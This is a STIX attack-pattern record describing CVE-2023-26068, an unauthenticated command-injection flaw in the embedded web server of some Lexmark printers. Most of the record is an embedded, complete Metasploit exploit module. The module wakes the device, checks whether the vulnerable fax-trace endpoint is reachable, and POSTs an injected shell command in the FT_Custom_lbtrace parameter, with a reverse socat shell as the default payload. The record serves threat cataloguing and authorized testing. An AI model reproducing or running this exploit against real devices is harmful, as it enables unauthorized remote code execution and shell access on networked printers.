{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a354ef1-0c9e-45dd-902f-5e89647d273a",
    "created": "2024-08-14T17:00:38.263495Z",
    "modified": "2024-08-14T17:00:38.263499Z",
    "name": "Lexmark Device Embedded Web Server RCE",
    "description": " A unauthenticated Remote Code Execution vulnerability exists in the embedded webserver in certain Lexmark devices through 2023-02-19. The vulnerability is only exposed if, when setting up the printer or device, the user selects \"Set up Later\" when asked if they would like to add an Admin user. If no Admin user is created the endpoint `/cgi-bin/fax_change_faxtrace_settings` is accessible without authentication. The endpoint allows the user to configure a number of different fax settings.  A number of the configurable parameters on the page (ex. `FT_Custom_lbtrace`) fail to be sanitized properly before being used in an bash eval statement: `eval \"$cmd\" > /dev/null`, allowing for an unauthenticated user to run arbitrary commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/lexmark_faxtrace_settings.rb",
            "external_id": "lexmark_faxtrace_settings.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2023-26067"
        },
        {
            "source_name": "reference",
            "url": "https://publications.lexmark.com/publications/security-alerts/CVE-2023-26068.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/lexmark-command-injection-vulnerability-zdi-can-19470-pwn2own-toronto-2022/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26068"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Retry\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Lexmark Device Embedded Web Server RCE',\n        'Description' => %q{\n          A unauthenticated Remote Code Execution vulnerability exists in the embedded webserver in certain Lexmark devices through 2023-02-19.\n          The vulnerability is only exposed if, when setting up the printer or device, the user selects \"Set up Later\" when asked\n          if they would like to add an Admin user. If no Admin user is created the endpoint `/cgi-bin/fax_change_faxtrace_settings`\n          is accessible without authentication. The endpoint allows the user to configure a number of different fax settings.\n\n          A number of the configurable parameters on the page (ex. `FT_Custom_lbtrace`) fail to be sanitized properly before being\n          used in an bash eval statement: `eval \"$cmd\" > /dev/null`, allowing for an unauthenticated user to run arbitrary commands.\n        },\n        'Author' => [\n          'James Horseman', # Analysis & PoC\n          'Zach Hanley',    # Analysis & PoC\n          'jheysel-r7'      # Msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/horizon3ai/CVE-2023-26067'],\n          [ 'URL', 'https://publications.lexmark.com/publications/security-alerts/CVE-2023-26068.pdf'],\n          [ 'URL', 'https://www.horizon3.ai/lexmark-command-injection-vulnerability-zdi-can-19470-pwn2own-toronto-2022/'],\n          [ 'CVE', '2023-26068']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix'],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => ['unix'],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_socat_tcp'\n              }\n            }\n          ]\n        ],\n        'Payload' => {\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'socat'\n            }\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-03-13',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('SLEEP', [true, 'Sleep time to wait for the printer to wake', 10]),\n      ]\n    )\n  end\n\n  def check\n    send_wakeup\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),\n      'method' => 'GET'\n    )\n\n    return Exploit::CheckCode::Unknown('The target did not respond ') unless res\n    return Exploit::CheckCode::Safe('The target does not seem to be vulnerable') unless res.code == 200 && res.get_xml_document.xpath('//title').text == 'Fax Trace Settings'\n\n    Exploit::CheckCode::Appears('The vulnerable endpoint \"/cgi-bin/fax_change_faxtrace_settings\" is reachable')\n  end\n\n  # If the printer has been inactive for some time it might be sleeping, in which case it's best to send a request\n  # or two to wake it up before running the check method or exploit.\n  def send_wakeup\n    retry_until_truthy(timeout: datastore['SLEEP']) do\n      print_status('Waking up the printer...')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),\n        'method' => 'HEAD'\n      )\n      break if res && res.code == 200\n    end\n  end\n\n  def exploit\n    if datastore['ForceExploit'] || !datastore['AutoCheck']\n      send_wakeup\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),\n      'method' => 'POST',\n      'data' => \"FT_Custom_lbtrace=3;$(#{payload.encoded});#\"\n    )\n    print_error('A response to the exploit attempt was received. This indicates the exploit was likely unsuccessful') if res\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-03-13",
    "x_mitre_platforms": [
        "['unix']"
    ]
}